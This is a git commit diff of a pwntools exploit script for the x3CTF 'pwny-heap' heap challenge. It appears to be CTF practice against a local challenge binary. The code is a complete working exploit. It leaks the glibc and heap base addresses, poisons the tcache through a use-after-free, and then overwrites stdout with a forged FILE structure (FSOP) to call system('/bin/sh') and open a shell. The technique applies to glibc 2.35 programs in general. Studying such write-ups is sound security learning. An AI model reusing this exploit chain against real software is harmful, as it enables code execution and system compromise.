4e6ad345722517c5ca116c617a5cec16cfd1b6ff
XinshengZhu <xinsheng.zhu.ny@gmail.com>
2025-06-23 18:25:11 +0800

    Update x3CTF

--- x3CTF/pwny-heap/pwny-heap.py
+++ x3CTF/pwny-heap/pwny-heap.py
@@ -9,64 +9,60 @@ p = gdb.debug('./pwny-heap_patched', gdbscript='''
 ''')
 
 def malloc(index, size):
-    p.sendlineafter(b"> ", b"1")
-    p.sendlineafter(b"index: ", b"%d" % index)
-    p.sendlineafter(b"size: ", b"%d" % size)
+    p.sendlineafter(b"> ", b'1')
+    p.sendlineafter(b"index: ", str(index).encode())
+    p.sendlineafter(b"size: ", str(size).encode())
 
 def free(index):
-    p.sendlineafter(b"> ", b"2")
-    p.sendlineafter(b"index: ", b"%d" % index)
+    p.sendlineafter(b"> ", b'2')
+    p.sendlineafter(b"index: ", str(index).encode())
 
 def view(index):
-    p.sendlineafter(b"> ", b"3")
-    p.sendlineafter(b"index: ", b"%d" % index)
+    p.sendlineafter(b"> ", b'3')
+    p.sendlineafter(b"index: ", str(index).encode())
     p.recvuntil(b": ")
     raw = p.recvuntil(b"1. ")[:-3]
     return raw
 
 def write(index, data):
-    p.sendlineafter(b"> ", b"4")
-    p.sendlineafter(b"index: ", b"%d" % index)
-    p.sendlineafter(b"write something in: ", b"%s" % data)
+    p.sendlineafter(b"> ", b'4')
+    p.sendlineafter(b"index: ", str(index).encode())
+    p.sendlineafter(b"write something in: ", data)
 
-# Leak glibc base address
-# Use fastbin attack: fill the tcache with 7 chunks and let the 8th chunk be in the unsorted bin
+# Stage 1: leak glibc base address
+# allocate 9 chunks, the last one is to avoid malloc_consolidate
 for i in range(9):
     malloc(i, 0xf8)
+# fill tcache with 7 chunks, let the 8th chunk be freed in unsorted bin
 for i in range(8):
     free(i)
-glibc_base_addr = u64(view(7).ljust(8, b"\x00"))-0x21ace0
-log.info("GLIBC BASE @ %s" % hex(glibc_base_addr))
+glibc_base_addr = u64(view(7).ljust(8, b'\x00'))-0x21ace0
+log.info(f"glibc base address: {hex(glibc_base_addr)}")
 
-# Leak heap base address
-# Use normal decrypt safe-linking
-heap_base_addr = ((u64(view(0).ljust(8, b"\x00"))<<12)^0)&~0xfff
-log.info("HEAP BASE @ %s" % hex(heap_base_addr))
+# Stage 2: leak heap base address
+heap_base_addr = ((u64(view(0).ljust(8, b'\x00'))<<12)^0)&~0xfff
+log.info(f"heap base address: {hex(heap_base_addr)}")
 
-# Prepare for tcache poisoning
-glibc_e = ELF("./libc-2.35.so")
+# Stage 3: tcache poisoning
+glibc_e = ELF('./libc-2.35.so')
 malloc(10, 0xf8)
+# chunk in position 6 and 10 are the same, UAF available
 free(6)
 write(10, p64((glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])^((heap_base_addr+0x8a0)>>12)))
-
-# Perform tcache poisoning
 malloc(11, 0xf8)
 malloc(12, 0xf8)
 
-# Perform FSOP on stdout
-stdout = glibc_e.sym['_IO_2_1_stdout_']+glibc_base_addr
-fake_vtable = glibc_e.sym['_IO_wfile_jumps']-0x18+glibc_base_addr
-gadget = next(glibc_e.search(asm('add rdi, 0x10 ; jmp rcx')))+glibc_base_addr
+# Stage 4: FSOP
 fake = FileStructure(0)
 fake.flags = 0x3b01010101010101
-fake._IO_read_end = glibc_e.sym['system']+glibc_base_addr
-fake._IO_save_base = gadget
+fake._IO_read_end = glibc_e.symbols['system']+glibc_base_addr
 fake._IO_write_end = u64(b'/bin/sh\x00')
-fake._lock = stdout+0x8*7
-fake._codecvt = stdout + 0xb8
-fake._wide_data =stdout+0x200
-fake.unknown2 = p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
-write(12, fake)
+fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
+fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
+fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
+fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
+fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18)
+write(12, bytes(fake))
 
 p.interactive()
 
